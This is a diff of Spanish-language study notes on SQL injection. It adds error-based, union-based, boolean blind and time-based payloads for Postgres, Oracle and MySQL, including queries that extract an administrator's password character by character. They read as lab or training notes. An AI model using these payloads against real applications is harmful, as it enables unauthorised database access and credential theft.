@@ -522,44 +522,64 @@ waitfor delay '00:00:10' Sleep
 ### Tipos de sqli:
 
 #### In-Band:
-- Error based:
-- Union based:
-  - Se une una segunda tabla al actual query, donde la segunda tabla sirve de pivote para saltar a más información.
-    - ORACLE:
+- Error based: En base a provocar errores aparte de ser la forma más directa de conocer que existe un SQLI, se puede provocar errores por ejemplo de casteo, donde regresa el valor sí hubo un problema en su conversión de string a integer.
+
+  - Posgres:
+
+1- Provocar el error: Con un simple mal cierre del query, se puede producir el error
+```sql
+    '
+```
+
+2- Error basico: Este cast deberia provocar que regrese un string pero el espera un integer, entonces mostrara el valor a en pantalla, tambien puedes hacer lo mismo para provocar que se muestre la versión
+```sql
+    ' AND 1=CAST((SELECT 'a') AS int)--
+    ' AND 1=CAST((SELECT version()) AS int)--
+```
+
+3- Información de columnas y tablas: Mismo paso donde puedes traer datos tipo integer y luego verlos como un error.
+```sql
+    ' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)-- 
+```
+
+- Union based: Se une una segunda tabla al actual query, donde la segunda tabla sirve de pivote para saltar a más información.
+  - ORACLE:
+
 1- Detectar la cantidad de campos que tiene la tabla actual:
   - Opción 1: Incrementar el groupby hasta que se detecte en que numero se provoca un error.
-```
-      - GROUP BY 1--
-      - GROUP BY 2--
+```sql
+      GROUP BY 1--
+      GROUP BY 2--
 ```
   - Opción 2: Incrementar la cantidad de null hasta encontrar donde se provoca el error.
-```
-      - ' UNION SELECT NULL FROM DUAL--
-      - ' UNION SELECT NULL,NULL FROM DUAL--
-      - ' UNION SELECT NULL,NULL,NULL FROM DUAL--
+```sql
+      ' UNION SELECT NULL FROM DUAL--
+      ' UNION SELECT NULL,NULL FROM DUAL--
+      ' UNION SELECT NULL,NULL,NULL FROM DUAL--
 ```
 2- Conocer el tipo de valor de cada campo, colocando varios tipos hasta encontrar uno que sea string, dado que es el más facil de manipular:
-```
-      - ' UNION SELECT 'A',NULL,NULL FROM DUAL--
-      - ' UNION SELECT NULL,'A',NULL FROM DUAL--
-      - ' UNION SELECT NULL,NULL,'A' FROM DUAL--
+```sql
+      ' UNION SELECT 'A',NULL,NULL FROM DUAL--
+      ' UNION SELECT NULL,'A',NULL FROM DUAL--
+      ' UNION SELECT NULL,NULL,'A' FROM DUAL--
 ```
 3- Comenzar a regresar información relevante como versiones, nombre de BD, incluso tablas:
-```
-    - VERSION:
-      - SELECT banner,NULL,NULL FROM v$version
-      - SELECT version,NULL,NULL FROM v$instance
-    - NOMBRE DE LAS TABLAS:
-      - ' UNION SELECT owner,table_name,NULL FROM all_tables--
-    - NOMBRE DE LAS COLUMNAS:
-      - ' UNION SELECT column_name,NULL,NULL FROM all_tab_columns WHERE table_name = 'APP_USERS_AND_ROLES'--
-      - ' UNION SELECT column_name,table_name FROM all_tab_columns--
+```sql
+    -- VERSION:
+      SELECT banner,NULL,NULL FROM v$version
+      SELECT version,NULL,NULL FROM v$instance
+    -- NOMBRE DE LAS TABLAS:
+      ' UNION SELECT owner,table_name,NULL FROM all_tables--
+    -- NOMBRE DE LAS COLUMNAS:
+      ' UNION SELECT column_name,NULL,NULL FROM all_tab_columns WHERE table_name = 'APP_USERS_AND_ROLES'--
+      ' UNION SELECT column_name,table_name FROM all_tab_columns--
 ```
 #### Blind:
 - Boleean based:
   - Basado en que provocar errores o ver sí existe diferencia en la respuesta del servidor a ejecutar querys con errores o valores especificos.
 
-- Postgres:
+  - Postgres mensaje en pantalla:
+
 1- Comportamiento: Detectar comportamientos basados en la respuesta como, por ejemplo sí el servidor regresa un "welcome" cuando el query regresa al menos una fila, o sí viene vacio no muestra el mensaje.
   -> Muestra el mensaje por regresar un campo:
 ```sql
@@ -582,37 +602,67 @@ waitfor delay '00:00:10' Sleep
 
 4- Conocer el valor del campo:
 ```sql
-  a' OR (SELECT password FROM users WHERE username = 'administrator') LIKE '$_$$_$$_$$_$$_$$_$$_$$_$$_$$_$$_$$_$$_$$_$$_$$_$$_$$_$$_$$_$'--
+    a' OR (SELECT password FROM users WHERE username = 'administrator') LIKE '$_$$_$$_$$_$$_$$_$$_$$_$$_$$_$$_$$_$$_$$_$$_$$_$$_$$_$$_$$_$'--
+```
+
+  - ORACLE Provocar errores
+1- Provocar calculos invalidos como dividir entre 0:
+  -> Payload 1: numeros 1 al tamaño del campo
+  -> payload 2: caracteres y numeros
+```sql
+    a' OR (SELECT CASE WHEN (SUBSTR(password,$payload1$,1)='$payload2$') THEN 'a' ELSE TO_CHAR(1/0) END FROM users WHERE username='administrator') = 'a'-- 
 ```
 
 - Time based:
   - Es en base a una función boleana, donde sí el tiempo de espera a la respuesta es mayor a la normal, significa que evalua la función como true y manda a hacer un sleep, o función que ralentiza su ejecución.
     - MYSQL:
 
-1 - Posición: Dependiendo de en que posición de la ejecución, pero los payloads más sencillos para mysql <5> es:
-```
-      - CAMPOS:   Select $<SLEEP(5)> FROM users;
-      - WHERE:    SELECT * FROM users WHERE username = '$<' OR SLEEP(5)--> -';
-      - ORDER BY: SELECT * FROM users ORDER BY $<IF(1=1, SLEEP(5), 1)>;
-      - HAVING:   SELECT COUNT(\*) FROM users GROUP BY role HAVING COUNT(*) > 0 $<OR SLEEP(5)>;
-      - LIMIT:    SELECT * FROM users LIMIT 1 $<OFFSET (SELECT SLEEP(5))>;
-      - IN:       SELECT * FROM users WHERE id IN $<(SELECT id FROM users WHERE SLEEP(5))>;
-      - UPDATE:   UPDATE users SET email = '$payload' WHERE id = 1; $payload= test@example.com', SLEEP(5), email='test2@example.com
-      - INSERT:   INSERT INTO logs (message) VALUES ('$payload'); $payload= x'), (SLEEP(5)), ('y
+1 - Posición: Dependiendo de en que posición de la ejecución, pero los payloads más sencillos para mysql v5 es:
+```sql
+      -- CAMPOS:
+        Select $<SLEEP(5)> FROM users;
+      -- WHERE:
+        SELECT * FROM users WHERE username = '$<' OR SLEEP(5)--> -';
+      -- ORDER BY:
+        SELECT * FROM users ORDER BY $<IF(1=1, SLEEP(5), 1)>;
+      -- HAVING:
+        SELECT COUNT(\*) FROM users GROUP BY role HAVING COUNT(*) > 0 $<OR SLEEP(5)>;
+      -- LIMIT:
+        SELECT * FROM users LIMIT 1 $<OFFSET (SELECT SLEEP(5))>;
+      -- IN:
+        SELECT * FROM users WHERE id IN $<(SELECT id FROM users WHERE SLEEP(5))>;
+      -- UPDATE:
+        UPDATE users SET email = '$payload' WHERE id = 1; $payload= test@example.com', SLEEP(5), email='test2@example.com
+      -- INSERT:
+        INSERT INTO logs (message) VALUES ('$payload'); $payload= x'), (SLEEP(5)), ('y
 ```
 2 - Validar: A partir de aquí primero debemos ejecutar una función donde validaremos que podemos hacer validaciones boleanas, con una función que en teoria casi siempre deberia funcionar, por ejemplo esta función va a hacer sleep sí encuentra que database contiene algun caracter:
-```
-      - AND (SELECT SLEEP(1) FROM DUAL WHERE DATABASE() LIKE '%')#
+```sql
+      ' AND (SELECT SLEEP(1) FROM DUAL WHERE DATABASE() LIKE '%')#
 ```
 3 - Contar caracteres: Podemos usar like '__' para ir incrementandolo hasta encontrar la cantidad de caracteres correcta:
-```
-      - AND (SELECT SLEEP(1) FROM DUAL WHERE DATABASE() LIKE '__')# Sí falso = no esperar tiempo
-      - AND (SELECT SLEEP(1) FROM DUAL WHERE DATABASE() LIKE '___')# Sí verdadero = espera 1 segundo
+```sql
+      ' AND (SELECT SLEEP(1) FROM DUAL WHERE DATABASE() LIKE '__')# Sí falso = no esperar tiempo
+      ' AND (SELECT SLEEP(1) FROM DUAL WHERE DATABASE() LIKE '___')# Sí verdadero = espera 1 segundo
 ```
 4 - Adivinar caracteres: Usando "Intruder" y "Sniper Attack", incrustamos el mismo payload con caracteres o numeros, y en "Resouce Pool" solo ponemos un "request" como maximo y solo buscamos los que tarden más en responder
 
+```sql
+      ' AND (SELECT SLEEP(1) FROM DUAL WHERE DATABASE() LIKE '$_$$_$$_$')#
 ```
-      - AND (SELECT SLEEP(1) FROM DUAL WHERE DATABASE() LIKE '$_$$_$$_$')#
+
+ - Postgres:
+
+1- Validaciones basicas: La posición dependera mucho de donde va la inyección, no se puede ejecutar sleep directamente sin validaciones, el más basico por ejemplo puede ser:
+```sql
+      ' AND pg_sleep(5) IS NULL --
+```
+
+2- Condicionales: Ejecución de espera
+  -> payload 1: numeros incrementales
+  -> payload 2: caracteres y numeros
+```sql
+      a' OR (SELECT CASE WHEN (SUBSTRING(password,$payload1$,1)='$payload2$') THEN pg_sleep(5) ELSE 'a' END FROM users WHERE username='administrator') IS NULL--
 ```
 
 #### Out of Band:
